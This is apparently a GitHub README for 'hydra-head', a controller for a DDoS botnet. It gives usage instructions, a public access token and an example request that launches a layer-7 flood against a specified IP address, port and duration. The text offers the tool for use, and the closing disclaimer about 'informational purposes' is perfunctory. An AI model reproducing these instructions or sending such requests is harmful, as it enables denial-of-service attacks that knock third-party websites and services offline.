# hydra-head
Head that manages HYDRA botnet clients
Client (https://github.com/devsofvoid/hydra-client)

# Usage
In order to use a botnet, you must have at least one client

An example of sending an attack request:
`http://localhost:3000/?token=HEREMUSTBETOKEN&method=l7&target=109.71.9.87&port=80&repeats=10&duration=5`

Token - You can create your token on the https://account.swizar.ru or use public key (`4OxfX3Jm45HaNcKh88VmVr0MrmiLsMTeGanWKddB`)
Method - Choose the method by which you will attack (Available only l7)
Target - Specify the target to be attacked (**without http:// or https://**, only domain)
Port - Specify the target port
Repeats - Specify repeats of attack
Duration - Specify the attack duration (in minutes)

# Disclaimer ⚠️
This script is for informational purposes only. The author is not responsible for any damage caused.
